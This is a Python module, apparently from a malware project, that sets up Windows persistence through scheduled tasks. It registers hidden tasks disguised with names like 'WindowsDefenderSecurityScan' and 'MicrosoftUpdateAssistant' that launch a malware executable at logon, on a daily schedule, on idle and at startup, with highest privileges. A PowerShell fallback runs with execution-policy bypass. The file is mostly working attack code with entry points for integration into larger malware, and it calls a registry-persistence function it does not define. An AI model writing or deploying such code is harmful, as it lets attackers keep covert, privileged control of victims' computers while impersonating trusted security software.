"""
Persistence Module: Scheduled Tasks
Developer: Chut Homey
Purpose: Establish persistence via Windows Scheduled Tasks

Project Spec: "Scheduled Task: Creating a hidden Windows Task that 
triggers the malware every time the system goes idle."
"""

import subprocess
import sys
import platform


class ScheduledTaskPersistence:
    """
    Implements Scheduled Task persistence technique
    Creates hidden Windows tasks for automatic execution
    """
    
    def __init__(self, malware_path):
        self.malware_path = malware_path
        self.created_tasks = []
    
    def create_basic_tasks(self):
        """
        Create multiple scheduled tasks with different triggers
        """
        print("[TASKS] Setting up Scheduled Task persistence...")
        
        task_definitions = [
            # Task 1: Run on user logon
            {
                'name': 'WindowsDefenderSecurityScan',
                'description': 'Windows Defender Security Monitoring Service',
                'trigger': 'logon',
                'schedule': None
            },
            # Task 2: Run daily at specific time
            {
                'name': 'SystemHealthMonitor',
                'description': 'System Health and Performance Monitor', 
                'trigger': 'daily',
                'schedule': '09:00'
            },
            # Task 3: Run when system is idle
            {
                'name': 'MicrosoftUpdateAssistant',
                'description': 'Microsoft Update Service Assistant',
                'trigger': 'idle', 
                'schedule': 'I5'  # 5 minutes idle
            }
        ]
        
        success_count = 0
        
        for task in task_definitions:
            if self._create_scheduled_task(task):
                self.created_tasks.append(task['name'])
                success_count += 1
        
        print(f"[TASKS] Created {success_count}/{len(task_definitions)} scheduled tasks")
        return success_count > 0
    
    def _create_scheduled_task(self, task_config):
        """
        Create a single scheduled task using schtasks command
        """
        try:
            task_name = task_config['name']
            
            # Build command based on trigger type
            if task_config['trigger'] == 'logon':
                cmd = [
                    'schtasks', '/create', '/tn', task_name,
                    '/tr', f'"{self.malware_path}"',
                    '/sc', 'onlogon',           # Trigger on logon
                    '/rl', 'highest',           # Run with highest privileges
                    '/f'                        # Force create
                ]
            elif task_config['trigger'] == 'daily':
                cmd = [
                    'schtasks', '/create', '/tn', task_name,
                    '/tr', f'"{self.malware_path}"', 
                    '/sc', 'daily',             # Daily schedule
                    '/st', task_config['schedule'],  # Start time
                    '/f'
                ]
            elif task_config['trigger'] == 'idle':
                cmd = [
                    'schtasks', '/create', '/tn', task_name,
                    '/tr', f'"{self.malware_path}"',
                    '/sc', 'onidle',            # On idle trigger
                    '/i', task_config['schedule'][1:],  # Idle time in minutes
                    '/f'
                ]
            else:
                return False
            
            # Execute the command
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            
            if result.returncode == 0:
                print(f"  [SUCCESS] Created task: {task_name} ({task_config['trigger']})")
                return True
            else:
                # Fallback to PowerShell method
                print(f"  [RETRY] schtasks failed, trying PowerShell...")
                return self._create_task_with_powershell(task_config)
                
        except subprocess.TimeoutExpired:
            print(f"  [ERROR] Timeout creating task: {task_config['name']}")
            return False
        except Exception as e:
            print(f"  [ERROR] Failed to create task {task_config['name']}: {e}")
            return False
    
    def _create_task_with_powershell(self, task_config):
        """
        Alternative method using PowerShell for more control
        """
        try:
            ps_script = f'''
$action = New-ScheduledTaskAction -Execute "{self.malware_path}"
$settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
'''
            
            # Add appropriate trigger
            if task_config['trigger'] == 'logon':
                ps_script += '$trigger = New-ScheduledTaskTrigger -AtLogOn\n'
            elif task_config['trigger'] == 'daily':
                ps_script += f'$trigger = New-ScheduledTaskTrigger -Daily -At "{task_config["schedule"]}"\n'
            elif task_config['trigger'] == 'idle':
                ps_script += '$trigger = New-ScheduledTaskTrigger -AtStartup\n'
            
            ps_script += f'''
Register-ScheduledTask -TaskName "{task_config['name']}" -Action $action -Trigger $trigger -Settings $settings -Description "{task_config['description']}" -RunLevel Highest -Force
Write-Output "TASK_CREATED"
'''
            
            result = subprocess.run([
                'powershell', '-ExecutionPolicy', 'Bypass', '-Command', ps_script
            ], capture_output=True, text=True, timeout=30)
            
            if "TASK_CREATED" in result.stdout:
                print(f"  [SUCCESS] PowerShell task: {task_config['name']}")
                return True
            else:
                print(f"  [ERROR] PowerShell failed: {result.stderr}")
                return False
                
        except Exception as e:
            print(f"  [ERROR] PowerShell method failed: {e}")
            return False
    
    def create_advanced_multi_trigger_task(self):
        """
        Advanced: Create a single task with multiple triggers
        """
        print("[TASKS] Creating advanced multi-trigger task...")
        
        advanced_script = f'''
$action = New-ScheduledTaskAction -Execute "{self.malware_path}"

# Multiple triggers for maximum persistence
$triggers = @(
    (New-ScheduledTaskTrigger -AtLogOn),
    (New-ScheduledTaskTrigger -AtStartup),
    (New-ScheduledTaskTrigger -Daily -At "03:00"),
    (New-ScheduledTaskTrigger -Weekly -At "12:00" -DaysOfWeek 1,3,5)
)

# Stealth settings
$settings = New-ScheduledTaskSettingsSet `
    -Hidden `
    -AllowStartIfOnBatteries `
    -DontStopIfGoingOnBatteries `
    -StartWhenAvailable `
    -MultipleInstances IgnoreNew

Register-ScheduledTask -TaskName "WindowsSystemMaintenance" -Action $action -Trigger $triggers -Settings $settings -Description "Windows System Maintenance Service" -RunLevel Highest -Force
Write-Output "ADVANCED_TASK_CREATED"
'''
        
        try:
            result = subprocess.run([
                'powershell', '-ExecutionPolicy', 'Bypass', '-Command', advanced_script
            ], capture_output=True, text=True, timeout=45)
            
            if "ADVANCED_TASK_CREATED" in result.stdout:
                self.created_tasks.append("WindowsSystemMaintenance")
                print("  [SUCCESS] Advanced multi-trigger task created")
                return True
            else:
                print(f"  [ERROR] Advanced task failed: {result.stderr}")
                return False
                
        except Exception as e:
            print(f"  [ERROR] Advanced task creation failed: {e}")
            return False
    
    def verify_tasks_exist(self):
        """
        Verify that created tasks exist in task scheduler
        """
        print("[TASKS] Verifying created tasks...")
        
        existing_tasks = []
        for task_name in self.created_tasks:
            try:
                cmd = ['schtasks', '/query', '/tn', task_name]
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
                
                if result.returncode == 0:
                    existing_tasks.append(task_name)
                    print(f"  [VERIFIED] Task exists: {task_name}")
                else:
                    print(f"  [MISSING] Task not found: {task_name}")
                    
            except Exception as e:
                print(f"  [ERROR] Verification failed for {task_name}: {e}")
        
        return existing_tasks
    
    def cleanup(self):
        """
        Remove all scheduled tasks created by this class
        """
        print("[TASKS] Cleaning up scheduled tasks...")
        
        removed_count = 0
        for task_name in self.created_tasks:
            try:
                cmd = ['schtasks', '/delete', '/tn', task_name, '/f']
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=20)
                
                if result.returncode == 0:
                    print(f"  [REMOVED] Task: {task_name}")
                    removed_count += 1
                else:
                    print(f"  [ERROR] Failed to remove: {task_name}")
                    
            except Exception as e:
                print(f"  [ERROR] Exception removing {task_name}: {e}")
        
        print(f"[TASKS] Removed {removed_count} scheduled tasks")

# Standalone test function
def test_scheduled_task_persistence():
    """
    Test function for Scheduled Task persistence technique
    """
    print("🔧 TESTING SCHEDULED TASK PERSISTENCE TECHNIQUE")
    print("=" * 50)
    
    # Use current script as test malware
    test_malware = sys.executable if hasattr(sys, 'frozen') else sys.argv[0]
    
    # Create task manager
    stp = ScheduledTaskPersistence(test_malware)
    
    # Test basic task creation
    success = stp.create_basic_tasks()
    
    # Test advanced task
    advanced_success = stp.create_advanced_multi_trigger_task()
    
    # Verify tasks
    existing_tasks = stp.verify_tasks_exist()
    
    print(f"\n📊 RESULTS:")
    print(f"Basic Tasks: {'SUCCESS' if success else 'FAILED'}")
    print(f"Advanced Task: {'SUCCESS' if advanced_success else 'FAILED'}")
    print(f"Verified Tasks: {len(existing_tasks)}/{len(stp.created_tasks)}")
    
    # Cleanup
    input("\nPress Enter to cleanup...")
    stp.cleanup()

# Entry point function for integration
def establish_task_persistence(malware_path=None):
    """
    Establish scheduled task persistence - entry point for integration
    
    Args:
        malware_path: Path to malware executable (default: current script)
    
    Returns:
        bool: True if persistence established successfully
    """
    if platform.system() != "Windows":
        print("[!] Scheduled task persistence only works on Windows")
        return False
    
    if malware_path is None:
        malware_path = sys.executable if hasattr(sys, 'frozen') else sys.argv[0]
    
    stp = ScheduledTaskPersistence(malware_path)
    return stp.create_basic_tasks()


def establish_persistence(malware_path=None):
    """
    Establish all persistence mechanisms - combined entry point
    
    Args:
        malware_path: Path to malware executable
    
    Returns:
        dict: Results of both persistence methods
    """
    results = {
        'registry': establish_registry_persistence(malware_path),
        'scheduled_task': establish_task_persistence(malware_path)
    }
    return results


if __name__ == "__main__":
    test_scheduled_task_persistence()